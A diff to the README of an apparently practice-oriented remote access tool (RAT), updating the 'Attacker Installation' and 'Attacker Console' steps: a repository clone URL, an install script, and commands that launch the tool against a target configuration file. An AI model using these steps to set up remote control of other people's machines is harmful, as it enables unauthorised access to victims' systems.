@@ -29,9 +29,9 @@ Created for practice, please use ethically.
 **Attacker Installation**
 - install rat by cloning this repository
 ```bash
-git clone RAT.git
+git clone https://github.com/tarasermolenko/RemoteAccessTool.git
 ```
-- install dependencies for OnlyRAT
+- install dependencies for RAT
 ```bash
 chmod +x install.sh
 ./install.sh
@@ -40,11 +40,11 @@ chmod +x install.sh
 **Attacker Console**
 - Run `rat` in your terminal for help
 ```bash
-onlyrat
+rat
 ```
 - Append configuraiton file to specify target
 ```bash
-onlyrat user.rat
+rat user.rat
 ```
 
 ## Overview: 
